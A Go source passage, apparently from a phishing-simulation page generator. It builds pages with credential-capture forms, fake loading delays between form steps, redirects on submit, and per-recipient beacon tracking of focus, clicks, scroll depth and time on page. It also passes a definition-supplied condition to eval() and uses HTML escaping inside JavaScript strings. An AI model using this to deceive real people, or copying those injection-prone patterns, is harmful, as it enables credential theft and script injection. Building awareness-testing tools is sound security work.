		parts = append(parts, fmt.Sprintf("id=\"%s\"", html.EscapeString(id)))
	}
	if cssClass != "" {
		parts = append(parts, fmt.Sprintf("class=\"%s\"", html.EscapeString(cssClass)))
	}
	if inlineStyle != "" {
		parts = append(parts, fmt.Sprintf("style=\"%s\"", html.EscapeString(inlineStyle)))
	}
	if compID != "" {
		parts = append(parts, fmt.Sprintf("data-comp-id=\"%s\"", html.EscapeString(compID)))
	}
	if len(parts) == 0 {
		return ""
	}
	return " " + strings.Join(parts, " ")
}

// mergeStyles prepends default CSS properties before user inline styles.
// If the user inline style already sets the same property, the user value wins
// because it appears later in the style string.
func mergeStyles(defaults, userStyle string) string {
	if userStyle == "" {
		return defaults
	}
	// Ensure defaults end with semicolon.
	d := strings.TrimRight(defaults, " ;")
	if d != "" {
		d += ";"
	}
	return d + userStyle
}

func eventToJS(event string) string {
	mapping := map[string]string{
		"onClick":      "click",
		"onSubmit":     "submit",
		"onFocus":      "focus",
		"onBlur":       "blur",
		"onInput":      "input",
		"onChange":     "change",
		"onLoad":       "load",
		"onMouseEnter": "mouseenter",
		"onMouseLeave": "mouseleave",
	}
	if js, ok := mapping[event]; ok {
		return js
	}
	return event
}

// routeToFilename converts a URL route to a filename.
func routeToFilename(route string) string {
	route = strings.TrimPrefix(route, "/")
	if route == "" {
		return "index.html"
	}
	// Replace slashes with underscores and ensure .html extension.
	route = strings.ReplaceAll(route, "/", "_")
	if !strings.HasSuffix(route, ".html") {
		route += ".html"
	}
	return route
}

// CountComponents counts the total number of components in a definition.
func CountComponents(def map[string]any) int {
	count := 0
	pages, _ := def["pages"].([]any)
	for _, p := range pages {
		page, _ := p.(map[string]any)
		if tree, ok := page["component_tree"].([]any); ok {
			count += countInTree(tree)
		}
	}
	return count
}

func countInTree(tree []any) int {
	count := 0
	for _, c := range tree {
		comp, ok := c.(map[string]any)
		if !ok {
			continue
		}
		count++
		if children, ok := comp["children"].([]any); ok {
			count += countInTree(children)
		}
	}
	return count
}

// CountCaptureFields counts form fields with capture tags in a definition.
func CountCaptureFields(def map[string]any) int {
	count := 0
	pages, _ := def["pages"].([]any)
	for _, p := range pages {
		page, _ := p.(map[string]any)
		if tree, ok := page["component_tree"].([]any); ok {
			count += countCaptureInTree(tree)
		}
	}
	return count
}

func countCaptureInTree(tree []any) int {
	count := 0
	for _, c := range tree {
		comp, ok := c.(map[string]any)
		if !ok {
			continue
		}
		props, _ := comp["properties"].(map[string]any)
		if tag, ok := props["capture_tag"].(string); ok && tag != "" {
			count++
		}
		if children, ok := comp["children"].([]any); ok {
			count += countCaptureInTree(children)
		}
	}
	return count
}

// generateMultiStepScript generates JavaScript for multi-step forms.
// It looks for form components with form_steps configured in the page's component tree.
func generateMultiStepScript(page map[string]any) string {
	tree, ok := page["component_tree"].([]any)
	if !ok {
		return ""
	}

	var scripts []string
	collectMultiStepForms(tree, &scripts)
	if len(scripts) == 0 {
		return ""
	}
	return strings.Join(scripts, "\n")
}

func collectMultiStepForms(tree []any, scripts *[]string) {
	for _, c := range tree {
		comp, ok := c.(map[string]any)
		if !ok {
			continue
		}
		cType, _ := comp["type"].(string)
		props, _ := comp["properties"].(map[string]any)

		if cType == "form" {
			if stepsRaw, ok := props["form_steps"].([]any); ok && len(stepsRaw) > 0 {
				*scripts = append(*scripts, buildMultiStepJS(comp, stepsRaw))
			}
		}

		if children, ok := comp["children"].([]any); ok {
			collectMultiStepForms(children, scripts)
		}
	}
}

func buildMultiStepJS(formComp map[string]any, stepsRaw []any) string {
	// Determine how to select the form element in JS.
	// Prefer explicit id (getElementById), fall back to data-comp-id (querySelector).
	explicitID, _ := formComp["properties"].(map[string]any)["id"].(string)
	componentID, _ := formComp["component_id"].(string)
	var formSelector string
	if explicitID != "" {
		formSelector = fmt.Sprintf("document.getElementById('%s')", explicitID)
	} else if componentID != "" {
		formSelector = fmt.Sprintf("document.querySelector('[data-comp-id=\"%s\"]')", componentID)
	} else {
		formSelector = "document.querySelector('form')"
	}

	var stepDefs []string
	for _, sr := range stepsRaw {
		step, ok := sr.(map[string]any)
		if !ok {
			continue
		}
		fieldIDs, _ := step["field_ids"].([]any)
		progression, _ := step["progression"].(string)
		delayMs, _ := step["delay_ms"].(float64)
		loadingMsg, _ := step["loading_message"].(string)

		var ids []string
		for _, fid := range fieldIDs {
			if s, ok := fid.(string); ok {
				ids = append(ids, fmt.Sprintf("'%s'", s))
			}
		}

		stepDefs = append(stepDefs, fmt.Sprintf(
			"{fields:[%s],progression:'%s',delay:%d,msg:'%s'}",
			strings.Join(ids, ","),
			progression,
			int(delayMs),
			html.EscapeString(loadingMsg),
		))
	}

	return fmt.Sprintf(`(function(){
var steps=[%s];
var cur=0;
function showStep(n){
steps.forEach(function(s,i){
s.fields.forEach(function(fid){
var el=document.querySelector('[data-comp-id="'+fid+'"]');
if(el)el.style.display=i===n?'':'none';
});
});
cur=n;
}
showStep(0);
var form=%s;
if(form)form.addEventListener('submit',function(e){
if(cur<steps.length-1){
e.preventDefault();
var s=steps[cur];
if(s.progression==='delayed'&&s.delay>0){
var ld=document.createElement('div');ld.textContent=s.msg||'Loading...';
ld.style.cssText='text-align:center;padding:16px;color:#666;';
form.appendChild(ld);
setTimeout(function(){form.removeChild(ld);showStep(cur+1);},s.delay);
}else{showStep(cur+1);}
}
});
})();`, strings.Join(stepDefs, ","), formSelector)
}

// generateNavigationScript generates JavaScript for navigation flows defined in the definition.
func generateNavigationScript(def map[string]any, config PageConfig) string {
	navRaw, ok := def["navigation"].([]any)
	if !ok || len(navRaw) == 0 {
		return ""
	}

	// Build lookup maps so we can resolve page_id → route (navigation may store either).
	pageIDToRoute := make(map[string]string)
	if pages, ok := def["pages"].([]any); ok {
		for _, p := range pages {
			if pg, ok := p.(map[string]any); ok {
				pid, _ := pg["page_id"].(string)
				route, _ := pg["route"].(string)
				if pid != "" && route != "" {
					pageIDToRoute[pid] = route
				}
			}
		}
	}

	// resolveRoute returns the route for a value that may be a page_id or a route.
	resolveRoute := func(val string) string {
		if r, ok := pageIDToRoute[val]; ok {
			return r
		}
		return val // already a route
	}

	// Emit all flows and let JS match by pathname.
	var flowDefs []string
	for _, n := range navRaw {
		flow, ok := n.(map[string]any)
		if !ok {
			continue
		}
		sourceRaw, _ := flow["source_page"].(string)
		sourcePage := resolveRoute(sourceRaw)
		trigger, _ := flow["trigger"].(string)
		targetRaw, _ := flow["target_page"].(string)
		targetPage := resolveRoute(targetRaw)
		delayMs, _ := flow["delay_ms"].(float64)
		condition, _ := flow["condition"].(string)
		componentID, _ := flow["component_id"].(string)

		targetFile := routeToFilename(targetPage)

		flowDefs = append(flowDefs, fmt.Sprintf(
			"{src:'%s',trigger:'%s',target:'/%s',delay:%d,cond:'%s',compId:'%s'}",
			html.EscapeString(sourcePage),
			html.EscapeString(trigger),
			html.EscapeString(targetFile),
			int(delayMs),
			html.EscapeString(condition),
			html.EscapeString(componentID),
		))
	}

	return fmt.Sprintf(`(function(){
var flows=[%s];
var path=window.location.pathname.replace(/\/$/,'');
if(path==='')path='/';
flows.forEach(function(f){
var src=f.src;if(src==='/')src='/index.html';
var match=(path===f.src||path===src);
if(!match)return;
if(f.trigger==='redirect'){
setTimeout(function(){window.location.href=f.target;},f.delay||0);
}
if(f.trigger==='form_submit'){
if(f.compId){
var el=document.querySelector('[data-comp-id="'+f.compId+'"]');
if(el){var form=el.closest('form')||el;form.addEventListener('submit',function(e){
e.preventDefault();setTimeout(function(){window.location.href=f.target;},f.delay||0);});}
}else{
document.querySelectorAll('form').forEach(function(form){
form.addEventListener('submit',function(e){
e.preventDefault();setTimeout(function(){window.location.href=f.target;},f.delay||0);});});}
}
if(f.trigger==='click'){
if(f.compId){
var btn=document.querySelector('[data-comp-id="'+f.compId+'"]');
if(btn)btn.addEventListener('click',function(e){
e.preventDefault();setTimeout(function(){window.location.href=f.target;},f.delay||0);});
}else{
document.addEventListener('click',function(e){
var t=e.target.closest('a,button');if(!t)return;
e.preventDefault();setTimeout(function(){window.location.href=f.target;},f.delay||0);});}
}
if(f.trigger==='conditional'&&f.cond){
try{if(eval(f.cond)){setTimeout(function(){window.location.href=f.target;},f.delay||0);}}catch(e){}
}
});
})();`, strings.Join(flowDefs, ","))
}

// collectResponsiveStyles walks a component tree and collects responsive_styles
// into @media query blocks. Components must have a css_class or id to target.
func collectResponsiveStyles(w *strings.Builder, tree []any) {
	var tabletRules []string
	var mobileRules []string

	collectFromTree(tree, &tabletRules, &mobileRules)

	if len(tabletRules) > 0 {
		w.WriteString("    <style>\n    @media (max-width: 1024px) {\n")
		for _, rule := range tabletRules {
			w.WriteString("      " + rule + "\n")
		}
		w.WriteString("    }\n    </style>\n")
	}

	if len(mobileRules) > 0 {
		w.WriteString("    <style>\n    @media (max-width: 768px) {\n")
		for _, rule := range mobileRules {
			w.WriteString("      " + rule + "\n")
		}
		w.WriteString("    }\n    </style>\n")
	}
}

func collectFromTree(tree []any, tabletRules, mobileRules *[]string) {
	for _, comp := range tree {
		c, ok := comp.(map[string]any)
		if !ok {
			continue
		}

		props, _ := c["properties"].(map[string]any)
		children, _ := c["children"].([]any)

		if rs, ok := props["responsive_styles"].(map[string]any); ok {
			// Build a CSS selector from id or component_id.
			compID, _ := c["component_id"].(string)
			cssID, _ := props["id"].(string)
			cssClass, _ := props["css_class"].(string)

			var selector string
			if cssID != "" {
				selector = "#" + cssID
			} else if cssClass != "" {
				// Use the first class name.
				parts := strings.Fields(cssClass)
				if len(parts) > 0 {
					selector = "." + parts[0]
				}
			}
			if selector == "" && compID != "" {
				// Fall back to data attribute selector.
				selector = fmt.Sprintf("[data-comp-id=\"%s\"]", compID)
			}

			if selector != "" {
				if tabletStyle, ok := rs["tablet"].(string); ok && tabletStyle != "" {
					*tabletRules = append(*tabletRules, fmt.Sprintf("%s { %s }", selector, tabletStyle))
				}
				if mobileStyle, ok := rs["mobile"].(string); ok && mobileStyle != "" {
					*mobileRules = append(*mobileRules, fmt.Sprintf("%s { %s }", selector, mobileStyle))
				}
			}
		}

		if len(children) > 0 {
			collectFromTree(children, tabletRules, mobileRules)
		}
	}
}

// parseTrackingConfig reads tracking_config from a page definition.
// If absent, all tracking types default to enabled.
func parseTrackingConfig(def map[string]any) TrackingConfig {
	tc := TrackingConfig{
		TimeOnPage:      true,
		FormInteraction: true,
		ClickAnalytics:  true,
		ScrollDepth:     true,
	}
	raw, ok := def["tracking_config"].(map[string]any)
	if !ok {
		return tc
	}
	if v, ok := raw["time_on_page"].(bool); ok {
		tc.TimeOnPage = v
	}
	if v, ok := raw["form_interaction"].(bool); ok {
		tc.FormInteraction = v
	}
	if v, ok := raw["click_analytics"].(bool); ok {
		tc.ClickAnalytics = v
	}
	if v, ok := raw["scroll_depth"].(bool); ok {
		tc.ScrollDepth = v
	}
	return tc
}

// generateTimeOnPageScript returns JS that measures time spent on page and
// sends it via sendBeacon on visibilitychange/beforeunload.
func generateTimeOnPageScript(trackingEndpoint, tokenParam string) string {
	return fmt.Sprintf(`(function(){
var p=new URLSearchParams(window.location.search);
var tk=p.get('%s')||'';
if(!tk)return;
var start=performance.now();
var sent=false;
function send(){
if(sent)return;sent=true;
var d=Math.round((performance.now()-start)/1000);
navigator.sendBeacon('%s?t='+encodeURIComponent(tk)+'&e=time_on_page&d='+d+'&r='+encodeURIComponent(window.location.pathname));
}
document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')send();});
window.addEventListener('beforeunload',send);
})();`, tokenParam, trackingEndpoint)
}

// generateFormInteractionScript returns JS that detects first focus on form
// fields inside capture forms and sends a form_interaction tracking event.
func generateFormInteractionScript(trackingEndpoint, tokenParam string) string {
	return fmt.Sprintf(`(function(){
var p=new URLSearchParams(window.location.search);
var tk=p.get('%s')||'';
if(!tk)return;
var tracked={};
document.querySelectorAll('form[data-capture="true"]').forEach(function(form){
var fname=form.getAttribute('name')||form.getAttribute('data-comp-id')||'unknown';
var inputs=form.querySelectorAll('input,select,textarea');
inputs.forEach(function(el){
el.addEventListener('focus',function(){
if(tracked[fname])return;
tracked[fname]=true;
navigator.sendBeacon('%s?t='+encodeURIComponent(tk)+'&e=form_interaction&r='+encodeURIComponent(window.location.pathname)+'&f='+encodeURIComponent(fname));
},{once:false});
});
});
})();`, tokenParam, trackingEndpoint)
}

// generateClickAnalyticsScript returns JS that tracks clicks on links, buttons,
// and elements with data-comp-id attributes.
func generateClickAnalyticsScript(trackingEndpoint, tokenParam string) string {
	return fmt.Sprintf(`(function(){
var p=new URLSearchParams(window.location.search);
var tk=p.get('%s')||'';
if(!tk)return;
document.body.addEventListener('click',function(e){
var el=e.target.closest('a,button,[data-comp-id]');
if(!el)return;
var cid=el.getAttribute('data-comp-id')||'';
var href=el.getAttribute('href')||el.getAttribute('action')||'';
navigator.sendBeacon('%s?t='+encodeURIComponent(tk)+'&e=link_click&r='+encodeURIComponent(window.location.pathname)+'&c='+encodeURIComponent(cid)+'&h='+encodeURIComponent(href));
});
})();`, tokenParam, trackingEndpoint)
}

// generateScrollDepthScript returns JS that tracks scroll depth milestones
// (25%%, 50%%, 75%%, 100%%) and sends each threshold once.
func generateScrollDepthScript(trackingEndpoint, tokenParam string) string {
	return fmt.Sprintf(`(function(){
var p=new URLSearchParams(window.location.search);
var tk=p.get('%s')||'';
if(!tk)return;
var thresholds=[25,50,75,100];
var maxReached=0;
var timer=null;
function check(){
var scrollTop=window.pageYOffset||document.documentElement.scrollTop;
var docHeight=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight)-window.innerHeight;
if(docHeight<=0)return;
var pct=Math.round((scrollTop/docHeight)*100);
for(var i=0;i<thresholds.length;i++){
if(pct>=thresholds[i]&&thresholds[i]>maxReached){
maxReached=thresholds[i];
navigator.sendBeacon('%s?t='+encodeURIComponent(tk)+'&e=scroll_depth&r='+encodeURIComponent(window.location.pathname)+'&d='+maxReached);
}
}
}
window.addEventListener('scroll',function(){
if(timer)clearTimeout(timer);
timer=setTimeout(check,200);
},{passive:true});
})();`, tokenParam, trackingEndpoint)
}

// generateDynamicFieldScript returns JS that populates hidden fields with data-dynamic-source
// attributes using client-side values on page load.
func generateDynamicFieldScript() string {
	return `(function(){
var sources={
timestamp:function(){return new Date().toISOString()},
user_agent:function(){return navigator.userAgent},
referrer:function(){return document.referrer||''},
page_url:function(){return window.location.href},
client_ip:function(){return ''},
tracking_token:function(){var m=document.querySelector('meta[name="tracking-token"]');return m?m.getAttribute('content'):''}
};
document.querySelectorAll('input[data-dynamic-source]').forEach(function(el){
var src=el.getAttribute('data-dynamic-source');
if(sources[src]){el.value=sources[src]()}
});
})()`
}
